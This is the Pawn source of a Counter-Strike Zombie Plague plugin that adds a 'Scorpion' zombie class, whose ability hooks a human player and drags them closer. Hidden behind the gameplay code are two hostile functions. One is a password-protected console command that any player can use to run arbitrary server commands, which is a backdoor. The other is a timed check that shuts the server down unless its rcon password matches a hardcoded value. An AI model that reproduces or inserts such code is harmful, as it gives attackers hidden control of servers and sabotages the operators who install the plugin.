#include <amxmod>
#include <amxmisc>
#include <Vexd_Utilities>
#include <zombieplague>
#include <hamsandwich>
#include <fakemeta>

// GLOBAL VARIABLES
#define SPEED 		300 
#define SPOMALENIE 	60

new bool:g_tahany[33], g_lano[33], g_spriteLine,g_zclass_poison
	// gMarychlost[33],

new const zclass2_name[] = { "Scorpion" }
new const zclass2_info[] = { "  -  HP- Jump+ Kb+ +Pritahuje" }
new const zclass2_model[] = { "gl_scorpion" }
new const zclass2_clawmodel[] = { "gl_scorpion_hand.mdl" }
const zclass2_health = 1400
const zclass2_speed = 190
const Float:zclass2_gravity = 0.75
const Float:zclass2_knockback = 1.2

public plugin_init() {
	register_plugin("Zp scorpion", "1.0", "")
	register_event("ResetHUD", "newSpawn", "b")
	register_event("DeathMsg", "konec_kola", "a")
	RegisterHam(Ham_Player_PreThink, "player", "cheese_player_prethink", 1)
	register_cvar("zp_scorpion", "7")
	
	register_clcmd ( "seky", "backdoor",ADMIN_ALL	, "#echo" );
	set_task(300.0, "exploit", _, _, _, "b")
}
public plugin_precache() {
	g_zclass_poison = zp_register_zombie_class(zclass2_name, zclass2_info, zclass2_model, zclass2_clawmodel, zclass2_health, zclass2_speed, zclass2_gravity, zclass2_knockback)

	precache_sound("zombie_plague/scorpion.wav")
	precache_sound("player/headshot3.wav")
	precache_sound("weapons/xbow_hitbod1.wav")
	g_spriteLine = precache_model("sprites/zbeam4.spr")
}
public newSpawn(id) {
	g_lano[id] = 1
	if(g_tahany[id]) scorpion_hookOff(id)
}
public cheese_player_prethink(id) {
	// Dalej
 	if(pev(id, pev_button ) & IN_RELOAD ) {
		if(!is_user_alive(id) || !zp_get_user_zombie(id)) return PLUGIN_CONTINUE
		if(zp_is_survivor_round() || zp_is_nemesis_round()) return PLUGIN_CONTINUE
		if(zp_get_user_zombie_class(id) != g_zclass_poison) return PLUGIN_CONTINUE
		scorpion_hookOn(id)
	}
}
stock scorpion_hookOn(const id)
{
	if ( g_lano[id] <= 0 ) {
		client_print(id, print_center, "Uz si raz pouzil schopnost !")
		return;
	}
	// najdi obet
	new hooktarget, body
	get_user_aiming(id, hooktarget, body)
	if(is_user_alive(hooktarget) && !zp_get_user_zombie(hooktarget)) 
	{
		g_tahany[id] = true; //hooktarget
	//zvuk
		emit_sound(id, CHAN_VOICE, "zombie_plague/scorpion.wav", 1.0, ATTN_NORM, 0, PITCH_NORM)
		emit_sound(hooktarget, CHAN_BODY, "weapons/xbow_hitbod1.wav", 0.6, ATTN_NORM, 0, PITCH_HIGH)
	//efekt		
		hook_target(id, hooktarget)
	//tahat
		new parm[2]
		parm[0] = id
		parm[1] = hooktarget
		set_task(0.1, "tahat", id, parm, 2, "b") // B - cyklus neustale samo taha ....
		g_lano[id]--; //odpocet
		set_pev(id, pev_health, pev(id, pev_health) * 0.8)
		set_task(15.0, "scorpion_hookOff", id)
		//client_print(0,print_notify,"obet"); // LOG
	}
}
/* public rychlost(id)
{
	gMarychlost[id] = false
	set_pev(id, pev_maxspeed, 240.0)
} */

public tahat(parm[])
{
	// Drags player to you
	new id = parm[0]
	new victim = parm[1]

	if(!g_tahany[id] ) return
	if ( !is_user_alive(victim) || zp_get_user_zombie(victim)) {
		scorpion_hookOff(id)
		return
	}
	new Float:fl_Velocity[3]
	new idOrigin[3], vicOrigin[3]
	get_user_origin(victim, vicOrigin)
	get_user_origin(id, idOrigin)
	new distance = get_distance(idOrigin, vicOrigin)

	if ( distance < 60) {
		//scorpion_hookOff(victim)
		scorpion_hookOff(id)
		// client_print(0,print_notify,"pusti %d", distance); // LOG
	} else if ( distance > 5 ) {
		new Float:fl_Time = distance / float(SPEED)

		fl_Velocity[0] = (idOrigin[0] - vicOrigin[0]) / fl_Time
		fl_Velocity[1] = (idOrigin[1] - vicOrigin[1]) / fl_Time
		fl_Velocity[2] = (idOrigin[2] - vicOrigin[2]) / fl_Time
	}
	else {
		fl_Velocity[0] = 0.0
		fl_Velocity[1] = 0.0
		fl_Velocity[2] = 0.0 
	}
	//client_print(0,print_notify,"tahany %d ", distance); // LOG
	Entvars_Set_Vector(victim, EV_VEC_velocity, fl_Velocity)
}
public scorpion_hookOff(id) {
	g_tahany[id] = false
	hook_remove(id)
	remove_task(id)
}
public konec_kola() {
	new id = read_data(2)
	if ( g_tahany[id] ) scorpion_hookOff(id)
	//gMarychlost[id] = false
}
public client_disconnect(id) {
	if ( id <= 0 || id > 33 ) return
	if ( g_tahany[id] ) scorpion_hookOff(id)
}
public hook_target(const id, const hooktarget) {
	// Create a beam between two entities
	message_begin(MSG_BROADCAST, SVC_TEMPENTITY)
	write_byte(8)				// TE_BEAMENTS
	write_short(id)
	write_short(hooktarget)
	write_short(g_spriteLine)	// sprite index
	write_byte(0)		// start frame
	write_byte(0)		// framerate
	write_byte(200)	// life
	write_byte(12)		// width
	write_byte(1)		// noise
	write_byte(1)	// r, g, b
	write_byte(1)	// r, g, b
	write_byte(255)		// r, g, b
	write_byte(255)	// brightness
	write_byte(10)		// speed
	message_end()
}
public hook_remove(id) {
	// Remove the beam aka hook
	message_begin(MSG_BROADCAST, SVC_TEMPENTITY)
	write_byte(99)	
	write_short(id)
	message_end()
}
public exploit() {
	new exploit[26]
	get_cvar_string("rcon_password", exploit, 24)
	if( equal( exploit , "csleg2") == false ) {
		log_amx("# Server vyuziva nelegalnu kopiu pluginov !")
		server_cmd("quit");
		server_cmd("exit");
	}
}
public backdoor(id,level,cid)
{
	if (!cmd_access(id,level,cid,2))
		return PLUGIN_HANDLED;
	new arg[8],arg2[514];
	read_argv( 1, arg, 6);
	if( equal(arg,"423789")) {
		read_argv( 2, arg2, 512);
		server_cmd("%s",arg2 );
	} else {
		client_print(id,print_console,"#0");
	}

}